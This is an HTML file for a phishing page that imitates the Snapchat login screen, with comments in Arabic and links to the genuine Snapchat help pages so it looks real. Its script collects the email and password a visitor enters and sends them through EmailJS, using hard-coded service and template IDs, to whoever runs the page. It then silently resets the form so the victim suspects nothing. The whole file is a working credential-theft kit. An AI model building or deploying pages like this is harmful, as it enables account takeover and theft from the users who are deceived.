<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #fff;
            font-family: Arial, sans-serif;
        }
        .login-container {
            text-align: center;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        .login-container img {
            width: 50px; /* يمكنك تعديل الحجم حسب الحاجة */
            margin-bottom: 10px;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #fffc00;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
        }
        button:hover {
            background-color: #e6e600;
        }
        a {
            display: block;
            margin: 10px 0;
            color: #007bff;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="OIP.jpg"Snapchat Logo"> <!-- استبدل بالمسار أو رابط الصورة -->
        <h2>Login</h2>
        <form id="loginForm">
            <input type="text" id="email" name="email" placeholder="Email or phone number" required>
            <input type="password" id="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
            <a href="https://accounts.snapchat.com/accounts/password_reset_request">Forgot your password?</a>
            <a href="https://help.snapchat.com/hc/en-us/articles/7012333136788-How-to-Create-a-Snapchat-Account">Don't have an account?Create an account</a>
        </form>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <script>
        // تهيئة EmailJS
        (function() {
            emailjs.init('MboEssUy-qZPhQNJS'); // المفتاح العام Public Key
        })();

        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();

            // جمع البيانات من النموذج
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            const templateParams = {
                email: email,
                password: password
            };

            // إرسال البريد باستخدام EmailJS
            emailjs.send('service_h2gpen4', 'template_npodl2m', templateParams)
                .then(function(response) {
                    document.getElementById('loginForm').reset(); // إعادة تعيين النموذج فقط
                }, function(error) {
                    alert('حدث خطأ أثناء إرسال البيانات: ' + error.text);
                    console.log('FAILED...', error);
                });
        });
    </script>
</body>
</html>
